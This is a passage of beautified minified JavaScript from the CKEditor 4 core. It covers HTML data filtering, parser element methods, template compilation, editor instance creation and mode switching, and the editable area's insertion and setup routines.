            }, null, null, 5), r.on("toDataFormat", function(e) {
                e.data.dataValue.filterChildren(i.htmlFilter, !0);
            }, null, null, 10), r.on("toDataFormat", function(e) {
                e.data.filter.applyTo(e.data.dataValue, !1, !0);
            }, null, null, 11), r.on("toDataFormat", function(e) {
                var t = e.data.dataValue, n = i.writer;
                n.reset(), t.writeChildrenHtml(n), t = g(t = c(t = n.getHtml(!0)), r), e.data.dataValue = t;
            }, null, null, 15);
        }, CKEDITOR.htmlDataProcessor.prototype = {
            toHtml: function(e, t, n, i) {
                var o, a, r, s = this.editor;
                return t && "object" == typeof t ? (o = t.context, n = t.fixForBody, i = t.dontFilter,
                a = t.filter, r = t.enterMode) : o = t, !o && null !== o && (o = s.editable().getName()),
                s.fire("toHtml", {
                    dataValue: e,
                    context: o,
                    fixForBody: n,
                    dontFilter: i,
                    filter: a || s.filter,
                    enterMode: r || s.enterMode
                }).dataValue;
            },
            toDataFormat: function(e, t) {
                var n, i, o;
                return t && (n = t.context, i = t.filter, o = t.enterMode), !n && null !== n && (n = this.editor.editable().getName()),
                this.editor.fire("toDataFormat", {
                    dataValue: e,
                    filter: i || this.editor.filter,
                    context: n,
                    enterMode: o || this.editor.enterMode
                }).dataValue;
            }
        };
        var E = /(?:&nbsp;|\xa0)$/, p = "{cke_protected}", T = CKEDITOR.dtd, o = [ "caption", "colgroup", "col", "thead", "tfoot", "tbody" ], C = CKEDITOR.tools.extend({}, T.$blockLimit, T.$block), a = {
            elements: {
                input: e,
                textarea: e
            }
        }, I = {
            attributeNames: [ [ /^on/, "data-cke-pa-on" ], [ /^data-cke-expando$/, "" ] ]
        }, O = {
            elements: {
                embed: function(e) {
                    if ((n = e.parent) && "object" == n.name) {
                        var t = n.attributes.width, n = n.attributes.height;
                        t && (e.attributes.width = t), n && (e.attributes.height = n);
                    }
                },
                a: function(e) {
                    if (!e.children.length && !e.attributes.name && !e.attributes["data-cke-saved-name"]) return !1;
                }
            }
        }, D = {
            elementNames: [ [ /^cke:/, "" ], [ /^\?xml:namespace$/, "" ] ],
            attributeNames: [ [ /^data-cke-(saved|pa)-/, "" ], [ /^data-cke-.*/, "" ], [ "hidefocus", "" ] ],
            elements: {
                $: function(e) {
                    var t = e.attributes;
                    if (t) {
                        if (t["data-cke-temp"]) return !1;
                        for (var n = [ "name", "href", "src" ], i = 0; i < n.length; i++) "data-cke-saved-" + n[i] in t && delete t[n[i]];
                    }
                    return e;
                },
                table: function(e) {
                    e.children.slice(0).sort(function(e, t) {
                        var n, i;
                        return e.type == CKEDITOR.NODE_ELEMENT && t.type == e.type && (n = CKEDITOR.tools.indexOf(o, e.name),
                        i = CKEDITOR.tools.indexOf(o, t.name)), -1 < n && -1 < i && n != i || (n = e.parent ? e.getIndex() : -1,
                        i = t.parent ? t.getIndex() : -1), i < n ? 1 : -1;
                    });
                },
                param: function(e) {
                    return e.children = [], e.isEmpty = !0, e;
                },
                span: function(e) {
                    "Apple-style-span" == e.attributes.class && delete e.name;
                },
                html: function(e) {
                    delete e.attributes.contenteditable, delete e.attributes.class;
                },
                body: function(e) {
                    delete e.attributes.spellcheck, delete e.attributes.contenteditable;
                },
                style: function(e) {
                    var t = e.children[0];
                    t && t.value && (t.value = CKEDITOR.tools.trim(t.value)), e.attributes.type || (e.attributes.type = "text/css");
                },
                title: function(e) {
                    var t = e.children[0];
                    !t && m(e, t = new CKEDITOR.htmlParser.text()), t.value = e.attributes["data-cke-title"] || "";
                },
                input: t,
                textarea: t
            },
            attributes: {
                class: function(e) {
                    return CKEDITOR.tools.ltrim(e.replace(/(?:^|\s+)cke_[^\s]*/g, "")) || !1;
                }
            }
        };
        CKEDITOR.env.ie && (D.attributes.style = function(e) {
            return e.replace(/(^|;)([^\:]+)/g, function(e) {
                return e.toLowerCase();
            });
        });
        var R = /<(a|area|img|input|source)\b([^>]*)>/gi, v = /([\w-]+)\s*=\s*(?:(?:"[^"]*")|(?:'[^']*')|(?:[^ "'>]+))/gi, b = /^(href|src|name)$/i, K = /(?:<style(?=[ >])[^>]*>[\s\S]*?<\/style>)|(?:<(:?link|meta|base)[^>]*>)/gi, y = /(<textarea(?=[ >])[^>]*>)([\s\S]*?)(?:<\/textarea>)/gi, _ = /<cke:encoded>([^<]*)<\/cke:encoded>/gi, k = /(<\/?)((?:object|embed|param|html|body|head|title)[^>]*>)/gi, N = /(<\/?)cke:((?:html|body|head|title)[^>]*>)/gi, S = /<cke:(param|embed)([^>]*?)\/?>(?!\s*<\/cke:\1)/gi;
    }(), CKEDITOR.htmlParser.element = function(e, t) {
        this.name = e, this.attributes = t || {}, this.children = [];
        var n = e || "", i = n.match(/^cke:(.*)/);
        i && (n = i[1]), n = !!(CKEDITOR.dtd.$nonBodyContent[n] || CKEDITOR.dtd.$block[n] || CKEDITOR.dtd.$listItem[n] || CKEDITOR.dtd.$tableContent[n] || CKEDITOR.dtd.$nonEditable[n] || "br" == n),
        this.isEmpty = !!CKEDITOR.dtd.$empty[e], this.isUnknown = !CKEDITOR.dtd[e], this._ = {
            isBlockLike: n,
            hasInlineStarted: this.isEmpty || !n
        };
    }, CKEDITOR.htmlParser.cssStyle = function(e) {
        var i = {};
        return ((e instanceof CKEDITOR.htmlParser.element ? e.attributes.style : e) || "").replace(/&quot;/g, '&quot;').replace(/\s*([^ :;]+)\s*:\s*([^;]+)\s*(?=;|$)/g, function(e, t, n) {
            "font-family" == t && (n = n.replace(/["']/g, "")), i[t.toLowerCase()] = n;
        }), {
            rules: i,
            populate: function(e) {
                var t = this.toString();
                t && (e instanceof CKEDITOR.dom.element ? e.setAttribute("style", t) : e instanceof CKEDITOR.htmlParser.element ? e.attributes.style = t : e.style = t);
            },
            toString: function() {
                var e, t = [];
                for (e in i) i[e] && t.push(e, ":", i[e], ";");
                return t.join("");
            }
        };
    }, p = function(e, t) {
        return (e = e[0]) < (t = t[0]) ? -1 : t < e ? 1 : 0;
    }, I = CKEDITOR.htmlParser.fragment.prototype, CKEDITOR.htmlParser.element.prototype = CKEDITOR.tools.extend(new CKEDITOR.htmlParser.node(), {
        type: CKEDITOR.NODE_ELEMENT,
        add: I.add,
        clone: function() {
            return new CKEDITOR.htmlParser.element(this.name, this.attributes);
        },
        filter: function(e, t) {
            var n, i, o, a, r = this;
            if ((t = r.getFilterContext(t)).off) return !0;
            for (r.parent || e.onRoot(t, r); ;) {
                if (n = r.name, !(i = e.onElementName(t, n))) return this.remove(), !1;
                if (r.name = i, !(r = e.onElement(t, r))) return this.remove(), !1;
                if (r !== this) return this.replaceWith(r), !1;
                if (r.name == n) break;
                if (r.type != CKEDITOR.NODE_ELEMENT) return this.replaceWith(r), !1;
                if (!r.name) return this.replaceWithChildren(), !1;
            }
            for (o in n = r.attributes) {
                for (i = n[a = o]; ;) {
                    if (!(a = e.onAttributeName(t, o))) {
                        delete n[o];
                        break;
                    }
                    if (a == o) break;
                    delete n[o], o = a;
                }
                a && (!1 === (i = e.onAttribute(t, r, a, i)) ? delete n[a] : n[a] = i);
            }
            return r.isEmpty || this.filterChildren(e, !1, t), !0;
        },
        filterChildren: I.filterChildren,
        writeHtml: function(e, t) {
            t && this.filter(t);
            var n, i, o = this.name, a = [], r = this.attributes;
            for (n in e.openTag(o, r), r) a.push([ n, r[n] ]);
            for (e.sortAttributes && a.sort(p), n = 0, i = a.length; n < i; n++) r = a[n], e.attribute(r[0], r[1]);
            e.openTagClose(o, this.isEmpty), this.writeChildrenHtml(e), this.isEmpty || e.closeTag(o);
        },
        writeChildrenHtml: I.writeChildrenHtml,
        replaceWithChildren: function() {
            for (var e = this.children, t = e.length; t; ) e[--t].insertAfter(this);
            this.remove();
        },
        forEach: I.forEach,
        getFirst: function(e) {
            if (!e) return this.children.length ? this.children[0] : null;
            var t;
            "function" != typeof e && (t = e, e = function(e) {
                return e.type == CKEDITOR.NODE_ELEMENT && ("string" == typeof t ? e.name == t : e.name in t);
            });
            for (var n = 0, i = this.children.length; n < i; ++n) if (e(this.children[n])) return this.children[n];
            return null;
        },
        getHtml: function() {
            var e = new CKEDITOR.htmlParser.basicWriter();
            return this.writeChildrenHtml(e), e.getHtml();
        },
        setHtml: function(e) {
            for (var t = 0, n = (e = this.children = CKEDITOR.htmlParser.fragment.fromHtml(e).children).length; t < n; ++t) e[t].parent = this;
        },
        getOuterHtml: function() {
            var e = new CKEDITOR.htmlParser.basicWriter();
            return this.writeHtml(e), e.getHtml();
        },
        split: function(e) {
            for (var t = this.children.splice(e, this.children.length - e), n = this.clone(), i = 0; i < t.length; ++i) t[i].parent = n;
            return (n.children = t)[0] && (t[0].previous = null), 0 < e && (this.children[e - 1].next = null),
            this.parent.add(n, this.getIndex() + 1), n;
        },
        addClass: function(e) {
            if (!this.hasClass(e)) {
                var t = this.attributes.class || "";
                this.attributes.class = t + (t ? " " : "") + e;
            }
        },
        removeClass: function(e) {
            var t = this.attributes.class;
            t && ((t = CKEDITOR.tools.trim(t.replace(RegExp("(?:\\s+|^)" + e + "(?:\\s+|$)"), " "))) ? this.attributes.class = t : delete this.attributes.class);
        },
        hasClass: function(e) {
            var t = this.attributes.class;
            return !!t && RegExp("(?:^|\\s)" + e + "(?=\\s|$)").test(t);
        },
        getFilterContext: function(e) {
            var t = [];
            if (e || (e = {
                off: !1,
                nonEditable: !1,
                nestedEditable: !1
            }), !e.off && "off" == this.attributes["data-cke-processor"] && t.push("off", !0),
            e.nonEditable || "false" != this.attributes.contenteditable ? e.nonEditable && !e.nestedEditable && "true" == this.attributes.contenteditable && t.push("nestedEditable", !0) : t.push("nonEditable", !0),
            t.length) {
                e = CKEDITOR.tools.copy(e);
                for (var n = 0; n < t.length; n += 2) e[t[n]] = t[n + 1];
            }
            return e;
        }
    }, !0), E = {}, CKEDITOR.template = function(e) {
        if (E[e]) this.output = E[e]; else {
            var t = e.replace(/([\\'])/g, "\\$1").replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/{([^}]+)}/g, function(e, t) {
                return "',data['" + t + "']==undefined?'{" + t + "}':data['" + t + "'],'";
            });
            this.output = E[e] = Function("data", "buffer", "return buffer?buffer.push('" + t + "'):['" + t + "'].join('');");
        }
    }, delete CKEDITOR.loadFullCore, CKEDITOR.instances = {}, CKEDITOR.document = new CKEDITOR.dom.document(document),
    CKEDITOR.add = function(e) {
        (CKEDITOR.instances[e.name] = e).on("focus", function() {
            CKEDITOR.currentInstance != e && (CKEDITOR.currentInstance = e, CKEDITOR.fire("currentInstance"));
        }), e.on("blur", function() {
            CKEDITOR.currentInstance == e && (CKEDITOR.currentInstance = null, CKEDITOR.fire("currentInstance"));
        }), CKEDITOR.fire("instance", null, e);
    }, CKEDITOR.remove = function(e) {
        delete CKEDITOR.instances[e.name];
    }, g = {}, CKEDITOR.addTemplate = function(e, t) {
        var n = g[e];
        return n || (n = {
            name: e,
            source: t
        }, CKEDITOR.fire("template", n), g[e] = new CKEDITOR.template(n.source));
    }, CKEDITOR.getTemplate = function(e) {
        return g[e];
    }, m = [], CKEDITOR.addCss = function(e) {
        m.push(e);
    }, CKEDITOR.getCss = function() {
        return m.join("\n");
    }, CKEDITOR.on("instanceDestroyed", function() {
        CKEDITOR.tools.isEmpty(this.instances) && CKEDITOR.fire("reset");
    }), CKEDITOR.TRISTATE_ON = 1, CKEDITOR.TRISTATE_OFF = 2, CKEDITOR.TRISTATE_DISABLED = 0,
    CKEDITOR.inline = function(e, t) {
        if (!CKEDITOR.env.isCompatible) return null;
        if ((e = CKEDITOR.dom.element.get(e)).getEditor()) throw 'The editor instance "' + e.getEditor().name + '" is already attached to the provided element.';
        var n = new CKEDITOR.editor(t, e, CKEDITOR.ELEMENT_MODE_INLINE), i = e.is("textarea") ? e : null;
        return i ? (n.setData(i.getValue(), null, !0), (e = CKEDITOR.dom.element.createFromHtml('<div contenteditable="' + !!n.readOnly + '" class="cke_textarea_inline">' + i.getValue() + "</div>", CKEDITOR.document)).insertAfter(i),
        i.hide(), i.$.form && n._attachToForm()) : n.setData(e.getHtml(), null, !0), n.on("loaded", function() {
            n.fire("uiReady"), n.editable(e), n.container = e, n.setData(n.getData(1)), n.resetDirty(),
            n.fire("contentDom"), n.mode = "wysiwyg", n.fire("mode"), n.status = "ready", n.fireOnce("instanceReady"),
            CKEDITOR.fire("instanceReady", null, n);
        }, null, null, 1e4), n.on("destroy", function() {
            i && (n.container.clearCustomData(), n.container.remove(), i.show()), n.element.clearCustomData(),
            delete n.element;
        }), n;
    }, CKEDITOR.inlineAll = function() {
        var e, t, n;
        for (n in CKEDITOR.dtd.$editable) for (var i = CKEDITOR.document.getElementsByTag(n), o = 0, a = i.count(); o < a; o++) "true" == (e = i.getItem(o)).getAttribute("contenteditable") && (t = {
            element: e,
            config: {}
        }, !1 !== CKEDITOR.fire("inline", t) && CKEDITOR.inline(e, t.config));
    }, CKEDITOR.domReady(function() {
        !CKEDITOR.disableAutoInline && CKEDITOR.inlineAll();
    }), CKEDITOR.replaceClass = "ckeditor", function() {
        function i(s, e, t, l) {
            if (!CKEDITOR.env.isCompatible) return null;
            if ((s = CKEDITOR.dom.element.get(s)).getEditor()) throw 'The editor instance "' + s.getEditor().name + '" is already attached to the provided element.';
            var c = new CKEDITOR.editor(e, s, l);
            return l == CKEDITOR.ELEMENT_MODE_REPLACE && (s.setStyle("visibility", "hidden"),
            c._.required = s.hasAttribute("required"), s.removeAttribute("required")), t && c.setData(t, null, !0),
            c.on("loaded", function() {
                var e, t, n, i, o, a, r;
                t = (e = c).name, n = e.element, i = e.elementMode, o = e.fire("uiSpace", {
                    space: "top",
                    html: ""
                }).html, a = e.fire("uiSpace", {
                    space: "bottom",
                    html: ""
                }).html, r = new CKEDITOR.template('<{outerEl} id="cke_{name}" class="{id} cke cke_reset cke_chrome cke_editor_{name} cke_{langDir} ' + CKEDITOR.env.cssClass + '"  dir="{langDir}" lang="{langCode}" role="application"' + (e.title ? ' aria-labelledby="cke_{name}_arialbl"' : "") + ">" + (e.title ? '<span id="cke_{name}_arialbl" class="cke_voice_label">{voiceLabel}</span>' : "") + '<{outerEl} class="cke_inner cke_reset" role="presentation">{topHtml}<{outerEl} id="{contentId}" class="cke_contents cke_reset" role="presentation"></{outerEl}>{bottomHtml}</{outerEl}></{outerEl}>'),
                t = CKEDITOR.dom.element.createFromHtml(r.output({
                    id: e.id,
                    name: t,
                    langDir: e.lang.dir,
                    langCode: e.langCode,
                    voiceLabel: e.title,
                    topHtml: o ? '<span id="' + e.ui.spaceId("top") + '" class="cke_top cke_reset_all" role="presentation" style="height:auto">' + o + "</span>" : "",
                    contentId: e.ui.spaceId("contents"),
                    bottomHtml: a ? '<span id="' + e.ui.spaceId("bottom") + '" class="cke_bottom cke_reset_all" role="presentation">' + a + "</span>" : "",
                    outerEl: CKEDITOR.env.ie ? "span" : "div"
                })), i == CKEDITOR.ELEMENT_MODE_REPLACE ? (n.hide(), t.insertAfter(n)) : n.append(t),
                e.container = t, o && e.ui.space("top").unselectable(), a && e.ui.space("bottom").unselectable(),
                n = e.config.width, i = e.config.height, n && t.setStyle("width", CKEDITOR.tools.cssLength(n)),
                i && e.ui.space("contents").setStyle("height", CKEDITOR.tools.cssLength(i)), t.disableContextMenu(),
                CKEDITOR.env.webkit && t.on("focus", function() {
                    e.focus();
                }), e.fireOnce("uiReady"), l == CKEDITOR.ELEMENT_MODE_REPLACE && c.config.autoUpdateElement && s.$.form && c._attachToForm(),
                c.setMode(c.config.startupMode, function() {
                    c.resetDirty(), c.status = "ready", c.fireOnce("instanceReady"), CKEDITOR.fire("instanceReady", null, c);
                });
            }), c.on("destroy", n), c;
        }
        function n() {
            var e = this.container, t = this.element;
            e && (e.clearCustomData(), e.remove()), t && (t.clearCustomData(), this.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE && (t.show(),
            this._.required && t.setAttribute("required", "required")), delete this.element);
        }
        CKEDITOR.replace = function(e, t) {
            return i(e, t, null, CKEDITOR.ELEMENT_MODE_REPLACE);
        }, CKEDITOR.appendTo = function(e, t, n) {
            return i(e, t, n, CKEDITOR.ELEMENT_MODE_APPENDTO);
        }, CKEDITOR.replaceAll = function() {
            for (var e = document.getElementsByTagName("textarea"), t = 0; t < e.length; t++) {
                var n = null, i = e[t];
                if (i.name || i.id) {
                    if ("string" == typeof arguments[0]) {
                        if (!RegExp("(?:^|\\s)" + arguments[0] + "(?:$|\\s)").test(i.className)) continue;
                    } else if ("function" == typeof arguments[0] && (n = {}, !1 === arguments[0](i, n))) continue;
                    this.replace(i, n);
                }
            }
        }, CKEDITOR.editor.prototype.addMode = function(e, t) {
            (this._.modes || (this._.modes = {}))[e] = t;
        }, CKEDITOR.editor.prototype.setMode = function(e, t) {
            var n = this, i = this._.modes;
            if (e != n.mode && i && i[e]) {
                if (n.fire("beforeSetMode", e), n.mode) {
                    var o, a = n.checkDirty(), r = (i = n._.previousModeData, 0);
                    n.fire("beforeModeUnload"), n.editable(0), n._.previousMode = n.mode, n._.previousModeData = o = n.getData(1),
                    "source" == n.mode && i == o && (n.fire("lockSnapshot", {
                        forceUpdate: !0
                    }), r = 1), n.ui.space("contents").setHtml(""), n.mode = "";
                } else n._.previousModeData = n.getData(1);
                this._.modes[e](function() {
                    n.mode = e, void 0 !== a && !a && n.resetDirty(), r ? n.fire("unlockSnapshot") : "wysiwyg" == e && n.fire("saveSnapshot"),
                    setTimeout(function() {
                        n.fire("mode"), t && t.call(n);
                    }, 0);
                });
            }
        }, CKEDITOR.editor.prototype.resize = function(e, t, n, i) {
            var o = this.container, a = this.ui.space("contents"), r = CKEDITOR.env.webkit && this.document && this.document.getWindow().$.frameElement;
            (i = i ? this.container.getFirst(function(e) {
                return e.type == CKEDITOR.NODE_ELEMENT && e.hasClass("cke_inner");
            }) : o).setSize("width", e, !0), r && (r.style.width = "1%"), a.setStyle("height", Math.max(t - (n ? 0 : (i.$.offsetHeight || 0) - (a.$.clientHeight || 0)), 0) + "px"),
            r && (r.style.width = "100%"), this.fire("resize");
        }, CKEDITOR.editor.prototype.getResizable = function(e) {
            return e ? this.ui.space("contents") : this.container;
        }, CKEDITOR.domReady(function() {
            CKEDITOR.replaceClass && CKEDITOR.replaceAll(CKEDITOR.replaceClass);
        });
    }(), CKEDITOR.config.startupMode = "wysiwyg", function() {
        function i(e) {
            var t = e.data.getTarget();
            t.is("input") && ("submit" == (t = t.getAttribute("type")) || "reset" == t) && e.data.preventDefault();
        }
        function L(e) {
            return h(e) && t(e);
        }
        function B(e, t, n) {
            return !1 !== e.config.autoParagraph && e.activeEnterMode != CKEDITOR.ENTER_BR && e.editable().equals(n) && !t || t && "true" == t.getAttribute("contenteditable");
        }
        function s(e) {
            e.editor.focus(), e.editor.fire("saveSnapshot");
        }
        function P(e) {
            var t = e.editor;
            t.getSelection().scrollIntoView(), setTimeout(function() {
                t.fire("saveSnapshot");
            }, 0);
        }
        function l(e, t, n) {
            var i = e.getCommonAncestor(t);
            for (t = e = n ? t : e; (e = e.getParent()) && !i.equals(e) && 1 == e.getChildCount(); ) t = e;
            t.remove();
        }
        CKEDITOR.editable = CKEDITOR.tools.createClass({
            base: CKEDITOR.dom.element,
            $: function(e, t) {
                this.base(t.$ || t), this.editor = e, this.status = "unloaded", this.hasFocus = !1,
                this.setup();
            },
            proto: {
                focus: function() {
                    var e;
                    if (CKEDITOR.env.webkit && !this.hasFocus && (e = this.editor._.previousActive || this.getDocument().getActive(),
                    this.contains(e))) e.focus(); else {
                        try {
                            this.$[CKEDITOR.env.ie && this.getDocument().equals(CKEDITOR.document) ? "setActive" : "focus"]();
                        } catch (e) {
                            if (!CKEDITOR.env.ie) throw e;
                        }
                        CKEDITOR.env.safari && !this.isInline() && ((e = CKEDITOR.document.getActive()).equals(this.getWindow().getFrame()) || this.getWindow().focus());
                    }
                },
                on: function(e, t) {
                    var n, i, o = Array.prototype.slice.call(arguments, 0);
                    return CKEDITOR.env.ie && /^focus|blur$/.exec(e) && (e = "focus" == e ? "focusin" : "focusout",
                    n = t, i = this, t = function(e) {
                        var t = CKEDITOR.dom.element.get(e.data.$.toElement || e.data.$.fromElement || e.data.$.relatedTarget);
                        (!t || !i.equals(t) && !i.contains(t)) && n.call(this, e);
                    }, o[0] = e, o[1] = t), CKEDITOR.dom.element.prototype.on.apply(this, o);
                },
                attachListener: function(e) {
                    !this._.listeners && (this._.listeners = []);
                    var t = Array.prototype.slice.call(arguments, 1);
                    return t = e.on.apply(e, t), this._.listeners.push(t), t;
                },
                clearListeners: function() {
                    var e = this._.listeners;
                    try {
                        for (;e.length; ) e.pop().removeListener();
                    } catch (e) {}
                },
                restoreAttrs: function() {
                    var e, t, n = this._.attrChanges;
                    for (t in n) n.hasOwnProperty(t) && (null !== (e = n[t]) ? this.setAttribute(t, e) : this.removeAttribute(t));
                },
                attachClass: function(e) {
                    var t = this.getCustomData("classes");
                    this.hasClass(e) || (!t && (t = []), t.push(e), this.setCustomData("classes", t),
                    this.addClass(e));
                },
                changeAttr: function(e, t) {
                    var n = this.getAttribute(e);
                    t !== n && (!this._.attrChanges && (this._.attrChanges = {}), e in this._.attrChanges || (this._.attrChanges[e] = n),
                    this.setAttribute(e, t));
                },
                insertHtml: function(e, t) {
                    s(this), c(this, t || "html", e);
                },
                insertText: function(e) {
                    s(this);
                    var t = (i = (t = this.editor).getSelection().getStartElement().hasAscendant("pre", !0) ? CKEDITOR.ENTER_BR : t.activeEnterMode) == CKEDITOR.ENTER_BR, n = CKEDITOR.tools, i = (e = (e = n.htmlEncode(e.replace(/\r\n/g, "\n"))).replace(/\t/g, "&nbsp;&nbsp; &nbsp;"),
                    i == CKEDITOR.ENTER_P ? "p" : "div");
                    if (!t) {
                        var o = /\n{2}/g;
                        if (o.test(e)) {
                            var a = "<" + i + ">", r = "</" + i + ">";
                            e = a + e.replace(o, function() {
                                return r + a;
                            }) + r;
                        }
                    }
                    e = e.replace(/\n/g, "<br>"), t || (e = e.replace(RegExp("<br>(?=</" + i + ">)"), function(e) {
                        return n.repeat(e, 2);
                    })), e = (e = e.replace(/^ | $/g, "&nbsp;")).replace(/(>|\s) /g, function(e, t) {
                        return t + "&nbsp;";
                    }).replace(/ (?=<)/g, "&nbsp;"), c(this, "text", e);
                },
                insertElement: function(e, t) {
                    t ? this.insertElementIntoRange(e, t) : this.insertElementIntoSelection(e);
                },
                insertElementIntoRange: function(e, t) {
                    var n, i, o = this.editor, a = o.config.enterMode, r = e.getName(), s = CKEDITOR.dtd.$block[r];
                    if (t.checkReadOnly()) return !1;
                    if (t.deleteContents(1), t.startContainer.type == CKEDITOR.NODE_ELEMENT && t.startContainer.is({
                        tr: 1,
                        table: 1,
                        tbody: 1,
                        thead: 1,
                        tfoot: 1
                    }) && d(t), s) for (;(n = t.getCommonAncestor(0, 1)) && (i = CKEDITOR.dtd[n.getName()]) && (!i || !i[r]); ) n.getName() in CKEDITOR.dtd.span ? t.splitElement(n) : t.checkStartOfBlock() && t.checkEndOfBlock() ? (t.setStartBefore(n),
                    t.collapse(!0), n.remove()) : t.splitBlock(a == CKEDITOR.ENTER_DIV ? "div" : "p", o.editable());
                    return t.insertNode(e), !0;
                },
                insertElementIntoSelection: function(e) {
                    s(this);
                    var t = this.editor, n = t.activeEnterMode, i = (t = t.getSelection()).getRanges()[0], o = e.getName();
                    o = CKEDITOR.dtd.$block[o], this.insertElementIntoRange(e, i) && (i.moveToPosition(e, CKEDITOR.POSITION_AFTER_END),
                    o && ((o = e.getNext(function(e) {
                        return L(e) && !u(e);
                    })) && o.type == CKEDITOR.NODE_ELEMENT && o.is(CKEDITOR.dtd.$block) ? o.getDtd()["#"] ? i.moveToElementEditStart(o) : i.moveToElementEditEnd(e) : o || n == CKEDITOR.ENTER_BR || (o = i.fixBlock(!0, n == CKEDITOR.ENTER_DIV ? "div" : "p"),
                    i.moveToElementEditStart(o)))), t.selectRanges([ i ]), P(this);
                },
                setData: function(e, t) {
                    t || (e = this.editor.dataProcessor.toHtml(e)), this.setHtml(e), this.fixInitialSelection(),
                    "unloaded" == this.status && (this.status = "ready"), this.editor.fire("dataReady");
                },
                getData: function(e) {
                    var t = this.getHtml();
                    return e || (t = this.editor.dataProcessor.toDataFormat(t)), t;
                },
                setReadOnly: function(e) {
                    this.setAttribute("contenteditable", !e);
                },
                detach: function() {
                    this.removeClass("cke_editable"), this.status = "detached";
                    var e = this.editor;
                    this._.detach(), delete e.document, delete e.window;
                },
                isInline: function() {
                    return this.getDocument().equals(CKEDITOR.document);
                },
                fixInitialSelection: function() {
                    function e() {
                        var e, t = o.getDocument().$, n = t.getSelection();
                        if (n.anchorNode && n.anchorNode == o.$) e = !0; else if (CKEDITOR.env.webkit) {
                            var i = o.getDocument().getActive();
                            i && i.equals(o) && !n.anchorNode && (e = !0);
                        }
                        e && ((e = new CKEDITOR.dom.range(o)).moveToElementEditStart(o), (t = t.createRange()).setStart(e.startContainer.$, e.startOffset),
                        t.collapse(!0), n.removeAllRanges(), n.addRange(t));
                    }
                    var t, n, i, o = this;
                    CKEDITOR.env.ie && (CKEDITOR.env.version < 9 || CKEDITOR.env.quirks) ? this.hasFocus && (this.focus(),
                    n = (t = o.getDocument().$).selection, i = o.getDocument().getActive(), "None" == n.type && i.equals(o) && (n = new CKEDITOR.dom.range(o),
                    t = t.body.createTextRange(), n.moveToElementEditStart(o), (n = n.startContainer).type != CKEDITOR.NODE_ELEMENT && (n = n.getParent()),
                    t.moveToElementText(n.$), t.collapse(!0), t.select())) : this.hasFocus ? (this.focus(),
                    e()) : this.once("focus", function() {
                        e();
                    }, null, null, -999);
                },
                setup: function() {
                    var c = this.editor;
                    if (this.attachListener(c, "beforeGetData", function() {
                        var e = this.getData();
                        this.is("textarea") || !1 !== c.config.ignoreEmptyParagraph && (e = e.replace(o, function(e, t) {
                            return t;
                        })), c.setData(e, null, 1);
                    }, this), this.attachListener(c, "getSnapshot", function(e) {
                        e.data = this.getData(1);
                    }, this), this.attachListener(c, "afterSetData", function() {
                        this.setData(c.getData(1));
                    }, this), this.attachListener(c, "loadSnapshot", function(e) {
                        this.setData(e.data, 1);
                    }, this), this.attachListener(c, "beforeFocus", function() {
                        var e = c.getSelection();
                        (e = e && e.getNative()) && "Control" == e.type || this.focus();
                    }, this), this.attachListener(c, "insertHtml", function(e) {
                        this.insertHtml(e.data.dataValue, e.data.mode);
                    }, this), this.attachListener(c, "insertElement", function(e) {
                        this.insertElement(e.data);
                    }, this), this.attachListener(c, "insertText", function(e) {
                        this.insertText(e.data);
                    }, this), this.setReadOnly(c.readOnly), this.attachClass("cke_editable"), this.attachClass(c.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? "cke_editable_inline" : c.elementMode == CKEDITOR.ELEMENT_MODE_REPLACE || c.elementMode == CKEDITOR.ELEMENT_MODE_APPENDTO ? "cke_editable_themed" : ""),
                    this.attachClass("cke_contents_" + c.config.contentsLangDirection), c.keystrokeHandler.blockedKeystrokes[8] = +c.readOnly,
                    c.keystrokeHandler.attach(this), this.on("blur", function() {
                        this.hasFocus = !1;
                    }, null, null, -1), this.on("focus", function() {
                        this.hasFocus = !0;
                    }, null, null, -1), c.focusManager.add(this), this.equals(CKEDITOR.document.getActive()) && (this.hasFocus = !0,
                    c.once("contentDom", function() {
                        c.focusManager.focus(this);
                    }, this)), this.isInline() && this.changeAttr("tabindex", c.tabIndex), !this.is("textarea")) {
                        c.document = this.getDocument(), c.window = this.getWindow();
                        var e = c.document;
                        this.changeAttr("spellcheck", !c.config.disableNativeSpellChecker);
                        var t = c.config.contentsLangDirection;
                        this.getDirection(1) != t && this.changeAttr("dir", t);
                        var n = CKEDITOR.getCss();
                        n && ((t = e.getHead()).getCustomData("stylesheet") || (n = e.appendStyleText(n),
                        n = new CKEDITOR.dom.element(n.ownerNode || n.owningElement), t.setCustomData("stylesheet", n),
                        n.data("cke-temp", 1))), t = e.getCustomData("stylesheet_ref") || 0, e.setCustomData("stylesheet_ref", t + 1),
                        this.setCustomData("cke_includeReadonly", !c.config.disableReadonlyStyling), this.attachListener(this, "click", function(e) {
                            e = e.data;
                            var t = new CKEDITOR.dom.elementPath(e.getTarget(), this).contains("a");
                            t && 2 != e.$.button && t.isReadOnly() && e.preventDefault();
                        });
                        var d = {
                            8: 1,
                            46: 1
                        };
                        this.attachListener(c, "key", function(e) {
                            if (c.readOnly) return !0;
                            var t;
                            if ((l = e.data.domEvent.getKey()) in d) {
                                var n, i, o, a, r = (e = c.getSelection()).getRanges()[0], s = r.startPath(), l = 8 == l;
                                CKEDITOR.env.ie && CKEDITOR.env.version < 11 && (n = e.getSelectedElement()) || (n = function(e) {
                                    function t(n) {
                                        return function(e, t) {
                                            if (t && e.type == CKEDITOR.NODE_ELEMENT && e.is(o) && (i = e), !t && L(e) && (!n || !u(e))) return !1;
                                        };
                                    }
                                    var i, n = e.getRanges()[0], o = (e = e.root, {
                                        table: 1,
                                        ul: 1,
                                        ol: 1,
                                        dl: 1
                                    });
                                    if (n.startPath().contains(o)) {
                                        var a = n.clone();
                                        if (a.collapse(1), a.setStartAt(e, CKEDITOR.POSITION_AFTER_START), (e = new CKEDITOR.dom.walker(a)).guard = t(),
                                        e.checkBackward(), i) return (a = n.clone()).collapse(), a.setEndAt(i, CKEDITOR.POSITION_AFTER_END),
                                        (e = new CKEDITOR.dom.walker(a)).guard = t(!0), i = !1, e.checkForward(), i;
                                    }
                                    return null;
                                }(e)) ? (c.fire("saveSnapshot"), r.moveToPosition(n, CKEDITOR.POSITION_BEFORE_START),
